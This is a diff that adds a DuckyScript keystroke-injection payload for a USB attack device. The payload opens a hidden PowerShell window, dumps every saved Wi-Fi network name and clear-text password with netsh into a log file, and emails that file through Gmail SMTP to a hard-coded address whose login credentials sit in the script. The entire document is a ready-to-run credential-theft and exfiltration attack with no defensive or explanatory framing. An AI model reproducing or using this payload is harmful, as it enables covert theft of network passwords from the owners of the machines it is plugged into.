@@ -1,0 +1,33 @@
+DELAY 500
+REM --> Open powershell
+WINDOWS r
+DELAY 300
+STRING powershell -windowstyle hidden (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File Log.txt
+ENTER
+DELAY 1500
+REM --> Mail Log.txt
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nirvatopia1337@gmail.com', 'kryptOniteSecurity!');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'nirvatopia1337@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('nirvatopia1337@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi'
+ENTER
+STRING $ReportEmail.Body = 'The log is attached!' 
+ENTER
+STRING $ReportEmail.Attachments.Add('Log.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 300
+STRING exit
+ENTER
